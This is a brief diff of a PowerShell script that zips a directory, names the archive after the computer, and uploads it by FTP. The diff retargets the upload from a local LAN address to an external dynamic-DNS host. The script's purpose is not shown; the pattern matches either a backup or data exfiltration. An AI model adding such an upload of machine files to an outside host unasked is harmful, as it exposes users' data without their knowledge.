@@ -14,7 +14,7 @@ $archive = $env:computername + ".zip"
 Compress-Archive -Path $path_d\* -DestinationPath $path_d\$archive -CompressionLevel Optimal
 
 $webclient = New-Object System.Net.WebClient 
-$ftp = "ftp://192.168.1.250/"
+$ftp = "ftp://fnnet.ddns.net/"
 $uri = New-Object System.Uri($ftp+$archive)
 $webclient.UploadFile($uri,$path_d+"\"+$archive)
 
